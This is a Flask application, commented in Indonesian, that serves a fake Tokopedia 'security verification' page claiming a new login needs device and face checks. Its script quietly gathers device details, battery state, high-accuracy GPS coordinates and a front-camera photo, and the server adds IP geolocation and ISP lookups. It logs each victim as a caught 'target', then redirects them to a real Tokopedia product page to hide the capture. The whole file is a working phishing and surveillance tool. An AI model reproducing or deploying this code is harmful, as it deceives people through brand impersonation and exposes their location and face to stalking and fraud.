from flask import Flask, request, render_template_string, jsonify
import requests
import re

app = Flask(__name__)

# --- KONFIGURASI (Target Tokopedia) ---
# Logo Tokopedia
IMAGE_URL = "https://upload.wikimedia.org/wikipedia/commons/9/9a/Logo-Tokopedia.png"
# Link Produk Asli (Tujuan akhir setelah data terambil)
TARGET_URL = "https://www.tokopedia.com/studioponsel/apple-macbook-air-m4-2025-13-inch-24-512gb-16-512gb-10-core-gpu-16-256gb-8-core-gpu-1730970954041230655?extParam=ivf%3Dfalse%26keyword%3Dmacbook+m4%26search_id%3D20251213173041C5FF2543B53F4C1C1ASB%26src%3Dsearch&t_id=1765647049167&t_st=1&t_pp=search_result&t_efo=search_pure_goods_card&t_ef=goods_search&t_sm=&t_spt=search_result"

# --- HTML TEMPLATE (Tampilan "Verifikasi Keamanan" Tokopedia) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tokopedia Security Check</title>
    <meta property="og:image" content="{{ image }}">
    <meta property="og:title" content="Verifikasi Pesanan Tokopedia">
    <meta property="og:description" content="Lakukan verifikasi keamanan untuk melanjutkan transaksi.">
    <style>
        body { font-family: 'Open Sans', sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; margin: 0; }
        .container { background: white; max-width: 400px; margin: 40px auto; padding: 30px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .logo { width: 150px; margin-bottom: 20px; }
        h3 { color: #42b549; margin-bottom: 10px; } /* Warna Hijau Tokopedia */
        p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        
        .btn { 
            background: #42b549; color: white; border: none; padding: 12px 25px; 
            border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; 
            width: 100%; transition: background 0.3s;
        }
        .btn:hover { background: #359c3b; }
        
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #42b549; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        video, canvas { display: none; }
        .status-text { font-size: 12px; color: #999; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="{{ image }}" class="logo" alt="Tokopedia">
        <h3>Verifikasi Keamanan</h3>
        <p>Sistem mendeteksi aktivitas login baru. Demi keamanan akun Anda, silakan lakukan verifikasi perangkat dan wajah singkat.</p>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
        
        <button class="btn" onclick="startVerification()" id="btn-verify">Verifikasi Sekarang</button>
        <div class="loader" id="loader"></div>
        <p class="status-text" id="status"></p>
    </div>

    <script>
        const targetUrl = "{{ target }}";
        
        // --- 1. AMBIL INFO DEVICE & BATERAI ---
        async function getDeviceInfo() {
            let info = {
                userAgent: navigator.userAgent,
                screen: screen.width + "x" + screen.height,
                gpu: "Unknown",
                battery: { level: "Unknown", charging: "Unknown" }
            };

            // Cek GPU
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}

            // Cek Baterai
            if (navigator.getBattery) {
                try {
                    const bat = await navigator.getBattery();
                    info.battery.level = Math.round(bat.level * 100) + "%";
                    info.battery.charging = bat.charging ? "Ya" : "Tidak";
                } catch(e) {}
            }
            return info;
        }

        // --- 2. AMBIL FOTO KAMERA ---
        function captureImage() {
            return new Promise(async (resolve, reject) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('video');
                    const canvas = document.getElementById('canvas');
                    
                    video.srcObject = stream;
                    
                    // Tunggu 1.5 detik buat fokus
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const data = canvas.toDataURL('image/jpeg', 0.5);
                        
                        stream.getTracks().forEach(track => track.stop()); // Matikan kamera
                        resolve(data);
                    }, 1500);
                } catch (err) {
                    resolve(null); // Jika ditolak, kembalikan null
                }
            });
        }

        // --- 3. AMBIL LOKASI GPS ---
        function getGPS() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({ lat: pos.coords.latitude, long: pos.coords.longitude, acc: pos.coords.accuracy }),
                        (err) => resolve(null),
                        { enableHighAccuracy: true, timeout: 20000 }
                    );
                } else {
                    resolve(null);
                }
            });
        }

        // --- MAIN FUNCTION ---
        async function startVerification() {
            document.getElementById('btn-verify').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('status').innerText = "Sedang memindai perangkat & lokasi...";

            // Jalankan paralel biar cepat (GPS + Device Info)
            const [gpsData, deviceData] = await Promise.all([getGPS(), getDeviceInfo()]);
            
            document.getElementById('status').innerText = "Memverifikasi biometrik...";
            
            // Jalankan Kamera
            const imageData = await captureImage();

            // Kirim semua data
            sendData(deviceData, gpsData, imageData);
        }

        function sendData(device, gps, image) {
            fetch('/log_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device: device, gps: gps, image: image })
            }).then(() => {
                window.location.href = targetUrl;
            }).catch(() => {
                window.location.href = targetUrl;
            });
        }
    </script>
</body>
</html>
"""

# --- FUNGSI PARSING ---
def parse_device_name(ua_string):
    if "iPhone" in ua_string: return "Apple iPhone"
    if "Android" in ua_string:
        match = re.search(r";\s?([^;]+?)\s?Build/", ua_string)
        if match: return f"Android - Model: {match.group(1).strip()}"
    if "Windows" in ua_string: return "Windows PC"
    if "Macintosh" in ua_string: return "Macbook"
    return "Unknown Device"

def get_ip_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,city,regionName,isp,mobile")
        return r.json() if r.status_code == 200 else None
    except: return None

# --- ROUTES ---
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def home(path):
    return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)

@app.route('/log_data', methods=['POST'])
def log_data():
    data = request.json
    
    # Ambil Data
    device = data.get('device', {})
    battery = device.get('battery', {})
    gps = data.get('gps')
    image_b64 = data.get('image')
    
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    geo_ip = get_ip_info(user_ip)
    dev_name = parse_device_name(device.get('userAgent', ''))

    # --- PRINT LOGS KE VERCEL ---
    print("\n" + "█"*50)
    print(f"🔥 TARGET TERTANGKAP! [IP: {user_ip}]")
    print("█"*50)

    print(f"\n📱 [DEVICE INFO]")
    print(f"• Model      : {dev_name}")
    print(f"• Baterai    : {battery.get('level')} (Charging: {battery.get('charging')})")
    print(f"• GPU        : {device.get('gpu')}")
    print(f"• Layar      : {device.get('screen')}")

    if gps:
        print(f"\n📍 [GPS AKURAT]")
        print(f"• Maps       : https://www.google.com/maps?q={gps['lat']},{gps['long']}")
        print(f"• Akurasi    : {gps['acc']} meter")
    else:
        print(f"\n📍 [GPS GAGAL] -> Menggunakan Lokasi IP")
        if geo_ip:
            print(f"• Kota       : {geo_ip.get('city')}, {geo_ip.get('regionName')}")
            print(f"• ISP        : {geo_ip.get('isp')}")

    if image_b64:
        print(f"\n📸 [FOTO WAJAH] (Copy kode di bawah ke Base64 Converter)")
        print("-" * 20)
        print(image_b64)
        # Catatan: Di log asli Vercel, kode ini mungkin akan terpotong jika terlalu panjang.
        # Tapi browser tetap mengirimnya. Jika ingin melihat full, hapus slicing [:200]
        print("-" * 20)
    else:
        print(f"\n❌ [FOTO] Target menolak izin kamera.")

    print("█"*50 + "\n")
    return jsonify({"status": "success"})